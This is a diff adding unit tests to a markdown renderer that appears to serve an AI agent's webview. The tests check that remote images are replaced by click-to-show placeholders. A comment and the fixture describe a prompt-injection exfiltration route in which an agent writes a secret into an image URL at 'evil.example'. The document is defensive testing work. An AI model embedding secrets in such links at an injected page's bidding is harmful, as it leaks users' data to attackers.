@@ -97,3 +97,35 @@ describe('the texts of the code blocks', () => {
     }
   });
 });
+
+describe('the images of a message (ESC-171)', () => {
+  it('never gives the webview an image of the web to load: its text, its domain and « Afficher l’image »', () => {
+    // An agent led by a page it read could write a secret in the address: loading it would send it.
+    const md = '![vue](https://evil.example/a.png?d=SECRET) et ![](https://cdn.example.org/x.gif) <img src="https://evil.example/b.png">';
+    const html = renderMarkdown(md);
+    expect(html).not.toMatch(/<img[^>]*src=["']?https:/i);
+    const d = dom(md);
+    expect(d.querySelectorAll('img[src]')).toHaveLength(0);
+    const labels = [...d.querySelectorAll<HTMLElement>('[data-remote-src]')];
+    expect(labels.map((l) => l.dataset.remoteSrc)).toEqual(['https://evil.example/a.png?d=SECRET', 'https://cdn.example.org/x.gif']);
+    expect(labels[0].textContent).toBe('vue · image de evil.example Afficher l’image');
+    expect(labels[1].querySelector('button[data-show-img]')?.textContent).toBe('Afficher l’image');
+    setLang('en');
+    expect(dom('![a](https://example.com/a.png)').querySelector('[data-remote-src]')?.textContent).toBe(
+      'a · image from example.com Show image',
+    );
+    setLang('fr');
+    const http = dom('![x](http://example.com/a.png)');
+    expect(http.querySelector('img')).toBeNull();
+    expect(http.querySelector('[data-img-off]')?.textContent).toBe('x');
+  });
+
+  it('leaves a local path for the core to read, by the agent (`data-local-src`)', () => {
+    for (const src of ['C:/w/.impeccable/tmp/a.png', '/home/me/a.png', 'shots/a.png', 'file:///C:/w/a%20b.png']) {
+      const d = dom(`![vue](${src})`);
+      expect(d.querySelector('img'), src).toBeNull();
+      expect(d.querySelector<HTMLElement>('[data-local-src]')?.dataset.localSrc, src).toBe(src);
+      expect(d.querySelector('[data-local-src]')?.textContent, src).toBe('vue');
+    }
+  });
+});
